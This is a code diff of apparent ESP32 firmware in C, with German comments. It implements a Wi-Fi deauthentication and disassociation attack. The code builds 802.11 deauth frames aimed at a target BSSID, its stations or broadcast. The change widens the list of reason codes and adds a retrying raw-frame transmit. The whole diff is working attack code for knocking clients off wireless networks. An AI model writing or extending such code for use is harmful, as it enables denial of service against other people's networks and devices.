@@ -20,7 +20,8 @@ static const uint8_t deauth_tmpl[26] = {
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // addr3 BSSID
     0x00, 0x00, 0x02, 0x00,             // SeqCtl=0 (HW füllt via en_sys_seq), reason
 };
-static const uint8_t deauth_reasons[] = {0x01, 0x04, 0x06, 0x07, 0x08};
+static const uint8_t deauth_reasons[] = {0x01, 0x04, 0x06, 0x07, 0x08,
+                                         0x0a, 0x0d, 0x0f, 0x12, 0x28};
 static const uint8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
 
 static bool s_ok_held;
@@ -62,9 +63,9 @@ static void deauth_tx_pair(const uint8_t* ra, const uint8_t* ta_bssid, uint8_t r
     memcpy(&f[10], ta_bssid, 6);
     memcpy(&f[16], ta_bssid, 6);
     f[24] = reason;
-    if(esp_wifi_80211_tx(WIFI_IF_STA, f, 26, true) == ESP_OK) s_frames_sent++;
+    if(wlan_hal_raw_tx_retry(f, 26)) s_frames_sent++;
     f[0] = 0xa0; // Disassoc subtype
-    if(esp_wifi_80211_tx(WIFI_IF_STA, f, 26, true) == ESP_OK) s_frames_sent++;
+    if(wlan_hal_raw_tx_retry(f, 26)) s_frames_sent++;
 }
 
 // Synchroner AP-Scan auf dem aktuellen Channel. Cached über Channel mit TTL.
@@ -143,9 +144,9 @@ static void deauth_task_fn(void* arg) {
             memcpy(&f[10], sta, 6);
             memcpy(&f[16], s_target_bssid, 6);
             f[24] = reason;
-            if(esp_wifi_80211_tx(WIFI_IF_STA, f, 26, true) == ESP_OK) s_frames_sent++;
+            if(wlan_hal_raw_tx_retry(f, 26)) s_frames_sent++;
             f[0] = 0xa0;
-            if(esp_wifi_80211_tx(WIFI_IF_STA, f, 26, true) == ESP_OK) s_frames_sent++;
+            if(wlan_hal_raw_tx_retry(f, 26)) s_frames_sent++;
         } else {
             deauth_tx_pair(broadcast_mac, s_target_bssid, reason);
         }
